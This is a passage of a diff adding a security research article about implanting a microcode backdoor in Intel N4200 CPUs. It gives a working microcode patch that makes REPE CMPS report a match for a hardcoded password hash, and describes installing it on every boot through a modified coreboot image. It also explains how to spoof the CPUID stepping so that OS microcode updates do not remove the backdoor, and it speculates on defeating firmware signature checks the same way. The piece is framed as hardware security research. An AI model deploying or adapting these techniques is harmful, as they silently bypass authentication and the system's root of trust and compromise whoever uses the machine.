+32-bit mode.
+
+TMP0-TMP15 are 64-bit microarchitectural registers that can be used as
+scratch registers within microcode routines. Unlike architectural registers
+(such as RAX, RBX, etc.), which share a single RFLAGS register, each
+microarchitectural register has its own dedicated set of arithmetic flags.
+These flags are updated whenever the register is used as the destination of
+an arithmetic micro-instruction.
+
+For instance, consider the micro-operation at: "U3cce: 10050003ac31
+SUB_DSZ32_DRR(TMP10, TMP1, TMP0) | MOD1". This instruction sets TMP10's Z
+flag if TMP1 equals TMP0. The subsequent micro-operation: "U3cd0:
+015f6410023a UJMPCC_DIRECT_TAKEN_CONDZ(tmp10, U0464)" then performs a
+conditional jump based on TMP10's Z flag state.
+
+This microcode routine is essentially what one would expect for a
+comparison instruction within a loop, except that instead of using CMP, the
+actual compare operation is performed by SUB, as is the case in the
+OpenSPARC CPU. Yet, despite the brevity of this code segment, several
+unresolved mysteries remain.
+
+For instance, what is the purpose of SIGEVENT(0x0000003b)? Why would the
+code send a signal immediately after checking the RCX register, before
+there is even a chance to trigger an access violation? Furthermore, if the
+subsequent LDZX_DSZN_ASZ32_SC1 operation accesses an illegal virtual
+address, should signals be generated then? Since the exact function of
+SIGEVENT remains unclear, the hook has been placed at U3cc8 instead of the
+cmps entry point U08b0 to avoid unintended side effects.
+
+
+--[ 3.4.3 CMPS Backdoor Implementation
+
+Now let's break down how this CMPS backdoor actually works. The mechanism
+is straightforward: when executed, it checks the memory location pointed to
+by RDI. If this value matches our predefined backdoor hash, the REPE CMPS
+instruction will set the Z flag in RFLAGS, falsely indicating string
+equivalence. Additionally, RCX must be cleared to zero, while RSI and RDI
+should be properly incremented or decremented based on the D flag. This
+adjustment is necessary because Windows' 64-bit RtlCompareMemory function
+determines string equality length using these register values. Again, we
+are using the hash '3dbde697d71690a769204beb12283678' (corresponding to
+password '123') for this experiment. To use less MSRAM space, the
+implementation compares only on the first 64 bits of the hash value, which
+is 0xa79016d797e6bd3d.
+
+The following microcode utilizes lib-micro[27] for writing to MSRAM and the
+Match/Patch registers. Its IN instruction microcode patch is essential for
+sustaining persistent microcode hooks. The forked version of lib-micro
+includes the CMPS backdoor implementation. Full source code is accessible
+at: https://github.com/whensungoesdown/lib-micro
+
+This project compiles and executes on Linux systems with CPU red unlocked,
+intended for testing and research purposes. The CMPS microcode hook remains
+effective even in virtualized environments using Intel VMX technology, as
+virtual machines execute most instructions (including CMPS) directly on the
+physical host CPU. This makes it convenient to test the backdoor's effects
+on a Windows system running inside a KVM/QEMU virtual machine.
+
+
+ ucode_t ucode_patch[] = {
+     {   // 0x0
+         // 64-bit 0xa79016d797e6bd3d
+         // 32-bit 0x97e6bd3d
+         NOP,
+         LDZX_DSZ32_ASZ32_SC1_DR(TMP1, RDI, 0x08) | MOD1,  // seg 0x08 es
+         ZEROEXT_DSZ32_DI(TMP0, 0xa790),
+         NOP_SEQWORD
+     },
+     {   // 0x4
+         SHL_DSZ64_DRI(TMP0, TMP0, 0x10),
+         ADD_DSZ64_DRI(TMP0, TMP0, 0x16d7),
+         SHL_DSZ64_DRI(TMP0, TMP0, 0x10),
+         NOP_SEQWORD
+     },
+     {   // 0x8
+         ADD_DSZ64_DRI(TMP0, TMP0, 0x97e6),
+         SHL_DSZ64_DRI(TMP0, TMP0, 0x10),
+         ADD_DSZ64_DRI(TMP0, TMP0, 0xbd3d),
+         NOP_SEQWORD
+     },
+     {   // 0xc
+         NOP,
+         //SUB_DSZ32_DRR(TMP10, TMP1, TMP0) | MOD1,   // dst, src0, src1
+         SUB_DSZ64_DRR(TMP10, TMP1, TMP0),   // dst, src0, src1
+         UJMPCC_DIRECT_NOTTAKEN_CONDZ_RI(TMP10, JUMP_DESTINATION),
+         NOP_SEQWORD
+         //0x018000e5, //SUB MSLOOP
+         // BUG FIX: no MSLOOP, msloop cause gdb traped at repe cmps with
+         //          resume flag (RF) set
+     },
+     {   // 0x10
+         //U3cc8: 1c0000231027   tmp1:= LDZX_DSZN_ASZ32_SC1(rdi, mode=0x08)
+         //U3cc9: 1c0000630026   tmp0:= LDZX_DSZN_ASZ32_SC1(rsi, mode=0x18)
+         //U3cca: 108501034d08   tmp4:= SUB_DSZN(0x00000001, tmp4)
+         0x1c0000231027, 0x1c0000630026, 0x108501034d08, 0x18000c0
+     },
+     {   // 0x1c
+         UJMP_I(hook_address+4),
+         UJMP_I(hook_address+5),
+         UJMP_I(hook_address+6),
+         NOP_SEQWORD
+     }
+ };
+
+ // JUMP_DESTINATION code
+ ucode_t ucode_patch[] = {
+     //U3ccc: 11890b8279c8 rdi:= ADDSUB_DSZ16_CONDD(
+     //                                   IMM_MACRO_ALIAS_DATASIZE, rdi)
+     //U3ccd: 11890b826988 rsi:= ADDSUB_DSZ16_CONDD(
+     //                                   IMM_MACRO_ALIAS_DATASIZE, rsi)
+     {
+         0x11890b8279c8, 0x11890b8279c8, 0x11890b826988, NOP_SEQWORD
+     },
+     {
+         0x11890b826988, NOP, NOP, NOP_SEQWORD
+     },
+     {
+         SUB_DSZ32_DRR(RCX, RCX, RCX) | MOD1,
+         GENARITHFLAGS_IR(0x0000003f, TMP10),
+         SFENCE,
+         END_SEQWORD
+     } // SEQW UEND0
+ };
+
+
+Initially, I used LDZX_DSZ64_ASZ64_SC8_DR(TMP1, RDI, 0x08) to read the
+first 64-bit value. The testing environment was a 32-bit Windows 10
+KVM/QEMU virtual machine. While the backdoored cmps instruction functioned
+correctly during the Windows login process, issues arose during the early
+boot stage after a system reboot. To resolve this, I switched to using
+LDZX_DSZ32_ASZ32_SC1_DR(TMP1, RDI, 0x08) | MOD1, as previously described. A
+likely reason for this behavior is that DSZ64/ASZ64 instructions are
+incompatible with the real-mode execution environment present during early
+boot stages.
+
+The implementation is hardcoded to hook at U3cc8, where the original triad
+is copied to be executed before branching to the next triad. This microcode
+is specific to the Intel N4200 (family 06, model 92) stepping 10, as CPUs
+of the same model with different steppings may have MSROM variations due to
+accumulated microcode patches.
+
+
+--[ 3.4.4 Installing Microcode Backdoors via Coreboot
+
+As introduced earlier, the attack scenario assumes that the CPU vendor
+implants a backdoor in the silicon during production. In the context of
+microcode, the vendor could either embed malicious microcode in the MSROM
+at the factory or distribute a harmful microcode patch to update all CPUs
+of the same model. This patch would load every time the system boots,
+placing the malicious code in the MSRAM. To validate this concept and
+closely emulate the vendor's actions, the most feasible approach is to
+embed the backdoor code in the BIOS and patch the microcode during each
+system boot.
+
+When Mark Ermolov, Dmitry Sklyarov, and Maxim Goryachy achieved the "Red
+Unlock" on an Intel Goldmont microarchitecture CPU, they used a Gigabyte
+NUC (model GB-BPCE-3350C) as their test machine. Later, KaKaRoTo continued
+this work on a Beelink-M1 NUC[28]. Subsequently, Alexander Krog and
+Alexander Skovsende released the lib-micro project, rewriting the exploit
+for their own machine, which I believe was an UP Squared Pro N4200.
+
+If you want to replicate this, you will likely need an Intel Silicon View
+Technology Closed Chassis Adapter (SVTCCA) to debug the Management Engine
+(ME) code. Otherwise, the best option is to find the exact same hardware
+and use the existing exploit.
+
+For my setup, I got Red Unlock working using their pre-built firmware.
+Although lib-micro's coreboot image did not boot on my UP Squared (Pro)
+board, but their exploit worked. As a workaround, I recompiled Coreboot
+with extracted modules.
+
+My Coreboot fork, including the CPU backdoor, is available at:
+https://github.com/whensungoesdown/coreboot
+
+It also provides a Coreboot pre-built image that enables Red Unlock, loads
+the CPU backdoor microcode, and fixes the VGA driver. I tested it on an UP
+Squared Pro N4200 (the 4GB RAM/32GB storage version). The coreboot and red
+unlock part should work fine on both UPSquared and UPSquared Pro boards,
+since there is not much difference between them. That said, if you've got a
+UPSquared board, you're probably looking at an N4200 stepping 9 CPU.
+Welcome to the 0x0 Bytes Left Club, see section 3.4.5.
+
+The microcode part is unchanged from the previous test project. The
+firmware implementation now requires loading this microcode on all CPU
+cores. One optimal place appears to be cpu_initialize() in arch/x86/cpu.c,
+as this is where coreboot applies the official microcode updates. The
+backdoor microcode patch should then be applied afterward.
+
+For simplicity, the CPU backdoor only compromises the CMPS instruction as
+previously described. But there is one issue. When attempting to install a
+newer version of Windows 10 (22H2, far more recent than the Intel N4200's
+release), the installer crashes with a MICROCODE_REVISION_MISMATCH
+bluescreen. Nice one, Microsoft.
+
+In contrast, Ubuntu 24.04 silently installs the microcode patch and removes
+the backdoor hooks without any warning.
+
+For CPU vendors, this should not be a concern as they control all microcode
+updates. For others, there is a solution: hooking the CPUID instruction and
+altering the stepping number, tricking the OS into believing the CPU is
+much newer, thus avoiding microcode updates.
+
+For example, testing on an older Windows 10 version (2016 release) works
+flawlessly: no installation errors, and the backdoor remains intact.
+However, altering the stepping number leaves a detectable trace. But
+seriously, who pays attention to that?
+
+--[ 3.4.5 The 0x0 Bytes Left Club
+
+During implementation and testing, two Intel N4200 processors were used,
+stepping 9 and 10. Clearly, the stepping 9 is an earlier iteration. It uses
+all available microcode RAM and takes 28 out of the 32 match/patch
+registers, as listed below.
+
+ idx p src    dst
+ 00: 0 0x0000  0x0000
+ 01: 1 0x1434  0x06c6
+ 02: 1 0x4c04  0x7c0a
+ 03: 1 0x61e6  0x7cae
+ 04: 1 0x757a  0x7cb0
+ 05: 1 0x244a  0x7cdc
+ 06: 1 0x065c  0x7c5c
+ 07: 1 0x29ca  0x7c2e
+ 08: 1 0x2078  0x7cf6
+ 09: 1 0x263a  0x7cfe
+ 10: 1 0x18c4  0x7cfa
+ 11: 1 0x78d6  0x7d02
+ 12: 1 0x2018  0x7c04
+ 13: 1 0x5b94  0x7c14
+ 14: 1 0x5ce2  0x7c88
+ 15: 1 0x6908  0x7c6c
+ 16: 1 0x3b52  0x7c4a
+ 17: 1 0x4e76  0x7db8
+ 18: 1 0x01ce  0x7ce6
+ 19: 1 0x2ec8  0x7d6e
+ 20: 1 0x6ff6  0x7d26
+ 21: 1 0x13da  0x7d94
+ 22: 1 0x667c  0x7cea
+ 23: 1 0x0cd2  0x7d0a
+ 24: 1 0x0e66  0x7d7a
+ 25: 1 0x4c5a  0x7dd6
+ 26: 1 0x24bc  0x7d12
+ 27: 1 0x31a4  0x7d36
+ 28: 1 0x758e  0x7df6
+ 29: 0 0x0000  0x0000
+ 30: 0 0x0000  0x0000
+ 31: 0 0x0000  0x0000
+
+
+Match/patch table is implemented as one of Microcode Sequencer
+Arrays (array 3), with the following structure:
+
+  30                    16 15                       0
+ +------------------------+------------------------+-+
+ |          dst           |           src          |p|
+ +------------------------+------------------------+-+
+            15                        15            1
+
+ p  : Indicates whether the entry is active
+ src: 15-bit source address (calculated as uaddr/2) representing the hook
+      location
+ dst: 15-bit destination address (calculated as uaddr/2) for the jump
+      target
+
+
+This component plays a critical role in the microcode update system. During
+microcode execution, when the processor encounters an instruction at the
+src address, the control flow is redirected to the corresponding dst
+address, enabling runtime modification of the execution path. The table
+contains 32 entries, with the first entry typically reserved/unused.
+
+The MSRAM is completely filled up to 0x7df6 (as shown in slot 28), and the
+whole space stops at 0x7dff in case I didn't mention that before.  It
+leaves no space to insert more microcode. At first, I assumed microcode
+patches were incrementally applied with each update. To test this, I
+disabled microcode updates in the Linux kernel and even removed the
+microcode blob from coreboot. Surprisingly, the microcode RAM became even
+more saturated, and one more match/patch register was occupied.
+
+This means that if you are using stepping 9 (or an even earlier revision,
+if one exists) this experiment may not be feasible. To free up space, I
+attempted to erase certain match/patch registers, assuming that
+security-related patches would have minimal impact. However, the system
+became unstable. Shows these microcode patches are more serious than I
+thought.
+
+According to Coreboot doc, "When a CPU core comes out of reset, it uses
+microcode from an internal ROM. This "default" microcode often contains
+bugs, so it needs to be updated as soon as possible. For example, Core 2
+CPUs can boot without microcode updates, but have stability problems. On
+newer platforms, it is nearly impossible to boot without having updated the
+microcode. On some platforms, an updated microcode is required in order to
+enable Cache-As-RAM or to be able to successfully initialize the DRAM.
+Plus, microcode needs to be loaded multiple times. Intel Document 504790
+explains that this is because of so-called enhanced microcode updates,
+which are large updates with errata workarounds for both core and uncore.
+In order to correctly apply enhanced microcode updates, the MP-Init
+algorithm must be decomposed into multiple initialization phases.
+...
+Beginning with 4th generation Intel Core processors, it is possible for
+microcode to be updated before the CPU is taken out of reset. This is
+accomplished by means of FIT, a data structure which contains pointers to
+various firmware ingredients in the BIOS flash."
+
+Microcode updates are not optional especially those FIT ones in BIOS,
+because modern CPUs need them to even work right. To mess up a CPU with
+heavy microcode patches, maybe the only way is to analysis it, find gaps
+and squeeze code pieces in there like old-school infection virus.
+
+For this project, it would be much easier to start with a CPU that is
+stepping 10, there should be enough space to implant the backdoor
+microcode. Below is the current match/patch status for stepping 10 under
+microcode revision 0x28.
+
+idx p src   dst
+00: 0 0x0000  0x0000
+01: 1 0x4dc0  0x7c4c
+02: 1 0x2078  0x7c0e
+03: 1 0x682a  0x7c86
+04: 1 0x1c3c  0x7c30
+05: 1 0x6a10  0x7c44
+06: 1 0x3c7a  0x7c22
+07: 1 0x4f52  0x7cca
+08: 1 0x01d6  0x7c6a
+09: 1 0x2e44  0x7cbe
+10: 1 0x70fa  0x7c9e
+11: 1 0x13c2  0x7cea
+12: 1 0x67a0  0x7c6e
+13: 1 0x0cd2  0x7c82
+14: 1 0x209c  0x28d8
+15: 1 0x141e  0x7c96
+16: 1 0x24bc  0x7c8a
+17: 1 0x623a  0x7d16
+18: 0 0x0000  0x0000
+19: 0 0x0000  0x0000
+20: 0 0x0000  0x0000
+21: 0 0x0000  0x0000
+22: 0 0x0000  0x0000
+23: 0 0x0000  0x0000
+24: 0 0x0000  0x0000
+25: 0 0x0000  0x0000
+26: 0 0x0000  0x0000
+27: 0 0x0000  0x0000
+28: 0 0x0000  0x0000
+29: 0 0x0000  0x0000
+30: 0 0x0000  0x0000
+31: 0 0x0000  0x0000
+
+
+--[ 3.4.6 CRBUS, LDAT and Memory Arrays
+
+An important aspect need to be covered is how data is read from MSROM and
+written to MSRAM. These operations rely on two critical components: CRBUS
+and LDAT. Since I'm still learning about these systems myself, I'll explain
+them to the best of my understanding.
+
+It makes sense for a processor to have an internal bus capable of
+monitoring the status of all its components. Such a bus would be essential
+for tasks like resetting hardware to predefined states, enabling or
+disabling specific features, and reading diagnostic data. While not
+documented in public specifications, these internal buses appear to exist
+across major architectures, such as Intel CRBUS (Configuration Register
+Bus) and IBM PIB (Pervasive Interconnect Bus).
+
+The CRBUS can be accessed through multiple interfaces[31]. One method is
+via the TAP (Test Access Port) which is a logic block responsible for
+executing tests and managing data flow along the boundary cells. In
+practice, this is commonly referred to as JTAG access.
+
+The following CRBUS read/write implementation is extracted from the TXE-POC
+project [23]:
+
+ def crbus_read(addr):
+     glm0 = ipc.devs.glm_module0
+     crbus_val = (0x3 << 79) | (addr << 65)
+     ipc.irdrscan(glm0, 0xa8, 83, None, crbus_val, False)
+     val = ipc.irdrscan(glm0, 0xa9, 83)
+     data = (val & ((1 <<  0x41) - 1)) >> 1
+     return data
+
+ def crbus_write(addr, val):
+     glm0 = ipc.devs.glm_module0
+     crbus_val = (0x1 << 80) | (addr << 65) | ((val &((1 << 64 ) -1)) << 1)
+     ipc.irdrscan(glm0, 0xa8, 83, None, crbus_val, False)
+
+
+The implementation utilizes ipccli lib's irdrscan function (from Intel
+System Studio) which performs combined IR/DR scan operations through the
+JTAG interface.
+
+ irdrscan(device, instruction, bitCount, data=None, writeData=None,
+          returnData=True)
+
+   Perform a combined IR/DR scan to the specified device, passing in the
+   specified instruction for the IR scan and the specified bit count for
+   the DR scan.
+
+   Parameters
+     device (int) – the did or alias of the device (not needed if using
+                    from a node object).
+
+     instruction (int) – The instruction to scan into the device.
+
+     bitCount (int) – The number of bits to scan from the data register of
+                      the designated device as selected by the current
+                      instruction register handle.
+
+     data (int) – can specify this or writeData with a number or BitData
+                  object to write to the device (see note about backwards
+                  compatibility).
+
+     writeData (int) – a number or BitData object to write to the device.
+
+     returnData (bool) – whether to return the data from the scan that was
+                         done.
+
+   Returns
+     A BitData object containing the bits that were read back.
+
+
+The second parameter specifies the instruction to be scanned into the
+device. While the exact meaning of the "0xa8" used in the Python code above
+seems to be undocumented, it may correspond to "CRBUS" instruction as
+referenced in a Intel patent[31]."
+
+According to the patent, the CRBUS consists of one 32-bit CR DATA BUS and
+10-bit CR ADDRESS & W/R BUS. Two different TAP instructions, "CRBUS" and
+"CRBUSNOGO", have been designed to perform the necessary accessing of
+control registers. The CRBUS command instructs the TAP to access the
+appropriate location and if it is a "write", to write the data to the
+accessed register. If the operation is a "read," then the CRBUS command
+instructs data to be read from the accessed register. The CRBUSNOGO
+instruction is used (along with the CRBUS instruction) only for a read
+operation, to shift the data out as a serial TDO signal.
+
+The referenced patent dates back to 2000, and modern implementations may
+differ significantly. For instance, the MSROM includes numerous control
+registers with addresses exceeding 10 bits. For current analysis, we can
+just treat CRBUS as an interconnect for accessing control registers
+distributed across the chip.
+
+An alternative method for accessing CRBUS is via the undocumented
+instructions UDBGRD and UDBGWR, as disclosed by researchers Mark Ermolov,
+Dmitry Sklyarov, and Maxim Goryachy and implemented in lib-micro. The
+relevant code snippet is provided below.
+
+ __attribute__((always_inline))
+ u_result_t static inline udbgrd(uint64_t type, uint64_t addr) {
+     lmfence();
+     u_result_t res;
+     asm volatile(
+         ".byte 0x0F, 0x0E\n\t"
+         : "=d" (res.value)
+         , "=b" (res.status)
+         : "a" (addr)
+         , "c" (type)
+     );
+     lmfence();
+     return res;
+ }
+
+ __attribute__((always_inline))
+ u_result_t static inline udbgwr(uint64_t type, uint64_t addr,
+                                                uint64_t value) {
+     uint32_t value_low = (uint32_t)(value & 0xFFFFFFFF);
+     uint32_t value_high = (uint32_t)(value >> 32);
+     u_result_t res;
+     lmfence();
+     asm volatile(
+         ".byte 0x0F, 0x0F\n\t"
+         : "=d" (res.value)
+         , "=b" (res.status)
+         : "a" (addr)
+         , "c" (type)
+         , "d" (value_low)
+         , "b" (value_high)
+     );
+     lmfence();
+     return res;
+ }
+
+
+The opcodes for UDBGRD and UDBGWR are 0F0E and 0F0F, respectively.
+Referring back to the opcode map in Section 2, the last two cells of the
+first row are unassigned, indeed, these correspond to undocumented
+instructions.
+
+The RCX register specifies the target device to access. A value of 0x0
+corresponds to the CRBUS, while 0x10 indicates URAM, which is a private
+memory region exclusive to a single CPU core and not shared with others.
+For CRBUS read or write operations, the RAX register holds the address of
+the target control register.
+
+For MSROM reads or MSRAM writes, the relevant control registers belong to
+LDAT (Large Data Array Testing[29] or Local Direct Access Test[30]). As the
+name suggests, the LDAT engine manages large data arrays.
+
+The engine has four registers: SDAT, PDAT, DATIN, and DATOUT[29][32]. By
+configuring SDAT/PDAT with address, array, bank, and other parameters,
+specific memory arrays can be read or written. It is unclear to me how this
+was reverse-engineered, whether through direct analysis or by referencing
+some XML files containing register address definitions. Previous
+research[30][32][27][33] provides these definitions, which I include here
+for easy reference.
+
+
+ SDAT Bitfield:
+    3                   2                   1                   0
+  1 0 9 8 7 6 5 4 3 2 1 0 9 8 7 6 5 4 3 2 1 0 9 8 7 6 5 4 3 2 1 0
+                 +-----------+---+-------+-------+-------+-------+
+                 |   Port    |Mod| DWord |ArrySel|       |BankSel|
+                 +-----------+---+-------+-------+-------+-------+
+
+ PDAT Bitfield:
+    3                   2                   1                   0
+  1 0 9 8 7 6 5 4 3 2 1 0 9 8 7 6 5 4 3 2 1 0 9 8 7 6 5 4 3 2 1 0
+ +---------------+---+-----------+-------------------------------+
+ |               | A1|           |          FastAddr             |
+ +---------------+---+-----------+-------------------------------+
+
+A1 Command fields:
+  | Encoding | Name   |
+  +----------+--------+
+  |        0 | NOP    |
+  |        2 | WRITE  |
+  |        3 | READ   |
+
+Known arrays:
+  | PDAT CR | ArraySel | Name           | Description                   |
+  +---------+----------+----------------+-------------------------------|
+  |   0x6A0 |        0 | ms_rom         | Microcode ROM triads          |
+  |   0x6A0 |        1 | ms_rom_seqw    | Microcode ROM sequence words  |
+  |   0x6A0 |        2 | ms_ram_seqw    | Microcode RAM sequence words  |
+  |   0x6A0 |        3 | ms_match_patch | Microcode match/patch         |
+  |   0x6A0 |        4 | ms_ram         | Microcode RAM triads          |
+
+
+Some control registers are not listed above. For example, set/unset bit-0
+of 0x692 to disable/enable the match/patch mechanism. And, writing 0 to
+0x38C halts frontend instruction fetching.
+
+The Microcode Sequencer utilizes five memory arrays. As previously
+described, array 3 stores the match/patch table. Arrays 0 and 1 form the
+microcode ROM space, spanning addresses 0x0000 through 0x7BFF. The writable
+RAM space consists of Arrays 2 and 4, occupying the address range from
+0x7C00 to 0x7DFF for microcode updates.
+
+Arrays 0 and 4 store microcode triads, with each entry consisting of three
+micro-operations and one unused field. For example, partial dump from array
+0:
+
+ addr   uop0         uop1         uop2         unused
+ 0000:  00626803f200 000801030008 004800013000 000000000000
+ 0004:  05b900013000 000a01000200 014800000000 000000000000
+ 0008:  000c6c97e208 0005a407de08 01310023d23d 000000000000
+ 000c:  00470003dc7d 0150015c027d 000000000000 000000000000
+ ...
+ 7bfc:  000000000000 000000000000 000004d3ebf4 000000000000
+
+
+Each microcode triad comprises three micro-instructions located at
+consecutive addresses (e.g., 0x0000-0x0002), with the fourth position
+consistently unused and zeroed. Array 4 maintains an identical structure
+for the writable microcode RAM space.
+
+Arrays 1 and 2 contain the sequence words that correspond to each microcode
+triad. As shown in this partial dump from array 1:
+
+ addr   seqw
+ 0000:  0000018e5e40 0000018e5e40 0000018e5e40 0000018e5e40
+ 0004:  00000b000240 00000b000240 00000b000240 00000b000240
+ 0008:  000001890900 000001890900 000001890900 000001890900
+ 000c:  000006a71180 000006a71180 000006a71180 000006a71180
+ ...
+ 7bfc:  0000018000c0 0000018000c0 0000018000c0 0000018000c0
+
+
+This quadruple repetition occurs because only one sequence word is needed
+per microcode triad and the addressing scheme for sequence word access may
+use (Uaddr >> 2) as the index. The design likely enables parallel fetching
+of both microcode triads and their corresponding sequence words by
+maintaining address alignment between the two structures.
+
+For the CMPS backdoor, if the pre-built coreboot image is correctly flashed
+onto the board, the following logs will appear in the serial console during
+boot. These logs demonstrate how the malicious microcode takes over the
+MSRAM.
+
+ [INFO ]  patching addr: 00007dbc - ram: 000001bc
+ [INFO ]  7dbc: 11890b8279c8 11890b8279c8 11890b826988 018000c0
+ [INFO ]  7dc0: 11890b826988 000000000000 000000000000 018000c0
+ [INFO ]  7dc4: 100500021861 237d3f000e88 0fff00000000 030000f2
+ [INFO ]  Patching 3de8 -> 7dc8
+ [INFO ]  7dc8: 000000000000 1c0000231027 0008901f000d 018000c0
+ [INFO ]  7dcc: 006410030230 0040d75b0230 006410030230 018000c0
+ [INFO ]  7dd0: 0040e65f0330 006410030230 00403d770370 018000c0
+ [INFO ]  7dd4: 000000000000 00450003ac31 0150bc7402fa 018000c0
+ [INFO ]  7dd8: 1c0000231027 1c0000630026 108501034d08 018000c0
+ [INFO ]  7ddc: 015dec740240 015ded740240 015dee740240 018000c0
+
+
+In the match/patch table, the last two entries are occupied: one
+corresponds to the backdoor hook (previously described, though with a
+different offset due to CPU stepping), and the other is the IN instruction
+microcode patch, which is critical for maintaining persistent microcode
+hooks.
+
+ idx p src   dst
+ 00: 0 0x0000  0x0000
+ 01: 1 0x4dc0  0x7c4c
+ 02: 1 0x2078  0x7c0e
+ 03: 1 0x682a  0x7c86
+ 04: 1 0x1c3c  0x7c30
+ 05: 1 0x6a10  0x7c44
+ 06: 1 0x3c7a  0x7c22
+ 07: 1 0x4f52  0x7cca
+ 08: 1 0x01d6  0x7c6a
+ 09: 1 0x2e44  0x7cbe
+ 10: 1 0x70fa  0x7c9e
+ 11: 1 0x13c2  0x7cea
+ 12: 1 0x67a0  0x7c6e
+ 13: 1 0x0cd2  0x7c82
+ 14: 1 0x209c  0x28d8
+ 15: 1 0x141e  0x7c96
+ 16: 1 0x24bc  0x7c8a
+ 17: 1 0x623a  0x7d16
+ 18: 0 0x0000  0x0000
+ 19: 0 0x0000  0x0000
+ 20: 0 0x0000  0x0000
+ 21: 0 0x0000  0x0000
+ 22: 0 0x0000  0x0000
+ 23: 0 0x0000  0x0000
+ 24: 0 0x0000  0x0000
+ 25: 0 0x0000  0x0000
+ 26: 0 0x0000  0x0000
+ 27: 0 0x0000  0x0000
+ 28: 0 0x0000  0x0000
+ 29: 0 0x0000  0x0000
+ 30: 1 0x3de8  0x7dc8
+ 31: 1 0x58ba  0x017a
+
+
+--[ 4. Miscellaneous
+
+----[ 4.1 x86 SSE/AVX Instruction Set
+
+When examining the strcmp() function on Linux x86_64 systems, we find it
+uses __strcmp_avx2(), a version optimized with AVX2 instructions, as seen
+in the disassembly output below.
+
+(gdb) disassemble
+Dump of assembler code for function __strcmp_avx2:
+=> 0x00007ffff7f30ae0 <+0>: endbr64
+   0x00007ffff7f30ae4 <+4>: mov    %edi,%eax
+   0x00007ffff7f30ae6 <+6>: xor    %edx,%edx
+   0x00007ffff7f30ae8 <+8>: vpxor  %ymm7,%ymm7,%ymm7
+   0x00007ffff7f30aec <+12>:    or     %esi,%eax
+   0x00007ffff7f30aee <+14>:    and    $0xfff,%eax
+   0x00007ffff7f30af3 <+19>:    cmp    $0xf80,%eax
+   0x00007ffff7f30af8 <+24>:    jg     0x7ffff7f30e50 <__strcmp_avx2+880>
+   0x00007ffff7f30afe <+30>:    vmovdqu (%rdi),%ymm1
+   0x00007ffff7f30b02 <+34>:    vpcmpeqb (%rsi),%ymm1,%ymm0
+   0x00007ffff7f30b06 <+38>:    vpminub %ymm1,%ymm0,%ymm0
+   0x00007ffff7f30b0a <+42>:    vpcmpeqb %ymm7,%ymm0,%ymm0
+   0x00007ffff7f30b0e <+46>:    vpmovmskb %ymm0,%ecx
+   0x00007ffff7f30b12 <+50>:    test   %ecx,%ecx
+   0x00007ffff7f30b14 <+52>:    je     0x7ffff7f30b90 <__strcmp_avx2+176>
+...
+
+
+AVX (Advanced Vector Extensions) is a feature in modern Intel and AMD
+processors that speeds up computations by processing multiple data elements
+at once. It uses special 256-bit registers (YMM) to perform SIMD (Single
+Instruction, Multiple Data) operations, making tasks like multimedia
+processing and scientific calculations much faster.
+
+In the GNU C Library (glibc), functions like strcmp() have multiple
+optimized variants, each designed to take advantage of specific CPU
+instruction sets, as illustrated in the code snippet below:
+
+/* Support sysdeps/x86_64/multiarch/strcmp.c.  */
+IFUNC_IMPL (i, name, strcmp,
+            IFUNC_IMPL_ADD (array, i, strcmp,
+                            HAS_ARCH_FEATURE (AVX2_Usable),
+                            __strcmp_avx2)
+            IFUNC_IMPL_ADD (array, i, strcmp, HAS_CPU_FEATURE (SSE4_2),
+                            __strcmp_sse42)
+            IFUNC_IMPL_ADD (array, i, strcmp, HAS_CPU_FEATURE (SSSE3),
+                            __strcmp_ssse3)
+            IFUNC_IMPL_ADD (array, i, strcmp, 1, __strcmp_sse2_unaligned)
+            IFUNC_IMPL_ADD (array, i, strcmp, 1, __strcmp_sse2))
+
+
+This mechanism, called IFUNC (Indirect Function) [17], is a GNU toolchain
+feature that allows multiple function implementations to be selected at
+runtime via a resolver. The dynamic loader invokes this resolver during
+startup to choose the optimal version (e.g., AVX2), which then remains
+fixed for the process's lifetime.
+
+String comparison using AVX2 is performed through vectorized operations
+where two 256-bit ymm registers are compared using VPCMPEQ. As each ymm
+register holds 32 bytes (VEC_SIZE), this allows comparing 32-byte string
+chunks in a single operation. For example:
+
+vmovdqu (%rdi),%ymm1
+vpcmpeqb (%rsi),%ymm1,%ymm0
+
+
+The vmovdqu instruction loads 32 bytes from the memory address in RDI into
+YMM1. The vpcmpeqb instruction then compares these 32 bytes against the
+contents at RSI's memory address, storing the comparison result in YMM0.
+Each byte position in YMM0 is set to 0xFF (all 1s) for matching bytes or
+0x00 (all 0s) for mismatches.
+
+The string comparison is performed using vpcmpeqb rather than traditional
+CMPS instructions. From the backdoor's perspective, this approach is more
+advantageous because these extended instruction sets are specialized and
+less frequently used than basic x86 instructions. Additionally, vpcmpeqb
+can compare significantly more bytes in a single operation, making it
+easier to identify the target hash string while minimizing the risk of
+accidental triggers. Note, complex instruction like vpcmpeqb are typically
+implemented through microcode.
+
+
+----[ 4.2 Other Thoughts
+
+In a computer system, trust is rooted in the firmware. Upon startup, the
+CPU runs immutable code stored in ROM or OTPROM (One-Time Programmable
+ROM), which authenticates the next firmware stage through digital signature
+verification. This process typically relies on asymmetric cryptography,
+such as RSA. The subsequent firmware is signed with a private key, while
+the ROM contains the corresponding public key to validate its integrity.
+Together, this immutable ROM code and embedded public key form the root of
+trust for the system.
+
+In practice, the OTPROM has limited capacity. Consequently, instead of
+storing the entire public key, only its hash is kept in OTPROM, while the
+full public key resides in external storage (e.g., EEPROM or FLASH). Thus,
+the ROM code's first step is to fetch the public key and verify its hash
+against the one stored in ROM. This comparison establishes the root of
+trust.
+
+After successfully authenticating the root public key, the system proceeds
+to validate the next stage firmware's digital signature. To understand how
+digital signatures work, let's take RSA (specifically, the
+RSASSA-PKCS1-V1_5 scheme) as an example. Suppose we have the firmware bin,
+that needs to be verified, along with its digital signature, bin_sig. The
+verification process uses the signer's public key to confirm that the
+signature is valid and the data has not been altered.
+
+1. Hash the input data: Compute the SHA-256 digest of the original data
+   ("bin"):
+
+   hash = sha256(bin);
+
+2. Encode the hash: Format the hash according to the EMSA-PKCS1-v1_5
+   padding scheme (which does not use salt):
+
+   hash_encode = EMSA-PKCS1-v1_5(hash);
+
+3. Decrypt the signature: Use the RSA public key to decrypt "bin_sig",
+   get the encoded hash:
+
+   hash_encode_from_sig = rsa_decrypt(bin_sig, public_key);
+
+4. Compare the hashes: Verify the signature by checking if the decrypted
+   encoded hash matches the locally computed encoded hash:
+
+   cmp(hash_encode_from_sig, hash_encode);
+
+
+The final hash comparison decides whether verification passes or fails.
+
+So far, the system has performed two hash string comparisons. But what if
+the CPU recognizes even a single one of these hashes? This could break the
+trust chain, allowing the execution of malicious code.
+
